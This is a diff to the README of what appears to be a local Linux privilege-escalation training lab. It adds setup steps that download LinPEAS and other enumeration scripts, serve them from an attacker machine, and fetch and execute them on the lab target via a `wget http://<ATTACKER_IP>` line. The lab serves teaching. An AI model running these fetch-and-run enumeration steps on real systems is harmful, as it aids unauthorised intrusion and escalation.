@@ -95,6 +95,28 @@ docker-compose up -d --build
 
 ---
 
+## 💻 Attacker Machine Setup
+To perform local enumeration and run offensive toolsets, prepare the following on your attacker machine (e.g., Kali Linux):
+
+### 1. Download Enumeration Scripts
+Prepare industry-standard enumeration scripts on your host:
+*   **LinPEAS**: `wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`
+*   **LinEnum**: `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
+*   **Linux Exploit Suggester**: `wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh`
+
+### 2. Hosting & Transferring to Lab Target
+*   **Option A (Python Web Server)**: Run `python3 -m http.server 8080` in the directory containing the scripts on your attacker machine, and fetch them inside the target container shell with:
+    ```bash
+    cd /tmp && wget http://<ATTACKER_IP>:8080/linpeas.sh
+    chmod +x linpeas.sh && ./linpeas.sh
+    ```
+*   **Option B (SCP)**: Copy scripts directly to the target machine:
+    ```bash
+    scp -P 2222 linpeas.sh student@localhost:/tmp/linpeas.sh
+    ```
+
+---
+
 ## ⚔️ Attack Scenarios
 This lab features 15 privilege escalation vectors categorised into 3 tiers of difficulty. Your objective is to capture the flags `/root/flag1.txt` through `/root/flag15.txt`.
 
